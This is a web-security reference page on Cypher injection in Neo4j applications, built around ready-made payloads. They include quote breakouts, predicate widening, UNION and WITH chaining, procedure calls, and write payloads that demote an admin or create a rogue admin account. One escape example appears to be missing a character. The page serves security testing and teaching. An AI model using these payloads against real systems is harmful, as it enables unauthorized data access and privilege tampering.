---
title: "Cypher injection: untrusted input in string-built Neo4j queries"
order: 1
description: "Concatenating user input into MATCH/WHERE clauses lets an attacker escape string literals, flip predicates, and chain Cypher clauses against Neo4j."
keywords:
  - Cypher injection
  - Neo4j
  - MATCH WHERE injection
  - string literal breakout
  - clause chaining
  - parameter binding
---

# Cypher injection

Cypher is Neo4j's query language. It supports **parameters** (`$name`, or `{name}` in older drivers) that the driver sends out-of-band from the query text, but when application code builds the query by concatenating user input, the input is parsed as Cypher and the query becomes injectable.

## Vulnerable pattern

```javascript
// name taken from the request
const q = "MATCH (u:User) WHERE u.name = '" + name + "' RETURN u";
session.run(q);
```

The safe form binds a parameter (`WHERE u.name = $name` with `{ name }`); the injectable form interpolates the value straight into the string literal.

## Breaking out of a string literal

The value sits inside single quotes, so a quote closes the literal and the rest is parsed as query syntax. Classic always-true breakout:

```
' OR 1=1 //
' OR true RETURN u //
' OR '1'='1
```

`//` comments to end of line and `/* ... */` comments a span, both used to discard the trailing part of the original query (the `' RETURN u` that follows the injection point). Where the input is numeric and unquoted, no closing quote is needed:

```
1 OR 1=1
```

## Altering patterns and predicates

Beyond flipping a boolean, injection rewrites the graph pattern. Relaxing a predicate returns rows the query meant to exclude:

```
admin' OR u.role = 'admin' //
' OR u.name =~ '.*' //
```

`=~` is Cypher's regex operator; `.*` matches every value. `IN`, `CONTAINS`, `STARTS WITH`, and `ENDS WITH` are equally useful for widening a filter.

## Chaining clauses

Cypher lets a query be a pipeline of clauses joined by `WITH`. After closing the literal, append your own clauses. `WITH` passes results forward and lets you introduce new variables, then a fresh `MATCH` pivots to unrelated nodes:

```
' WITH u MATCH (x:User) RETURN x //
' RETURN u UNION MATCH (n) RETURN n //
```

`UNION` combines result sets (column names must line up; see [Data extraction](data-extraction.md)). Write operations may be reachable too when the session is not read-only:

```
' WITH u MATCH (a:User {name:'admin'}) SET a.role='user' //
' CREATE (:User {name:'pwn', role:'admin'}) //
```

`CALL` is the gateway to procedures, including the APOC library:

```
' CALL db.labels() YIELD label RETURN label //
```

See [APOC procedure abuse](apoc-procedure-abuse.md) for the high-impact procedures.

## Probing the injection point

Submit a lone quote (`'`) and watch for a Cypher parse error (`Neo.ClientError.Statement.SyntaxError`) leaking in the response, a reliable signal the input lands in query text. Comparing `' OR 1=1 //` against `' OR 1=2 //` confirms the predicate is evaluated. Where errors are suppressed and no rows are reflected, fall back to [Blind injection](blind-injection.md).

Cypher string literals also accept escapes (`'` for a quote, `\n`), useful where a filter strips raw quotes but passes the escaped form to the parser.

## Tools

- **cypher-shell**: test literal breakouts and clause chaining directly.
- **Burp Repeater**: craft and resend breakout payloads through the parameter.

## References

- [Neo4j: Cypher parameters](https://neo4j.com/docs/cypher-manual/current/syntax/parameters/)
- [Neo4j: Cypher comments and syntax](https://neo4j.com/docs/cypher-manual/current/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
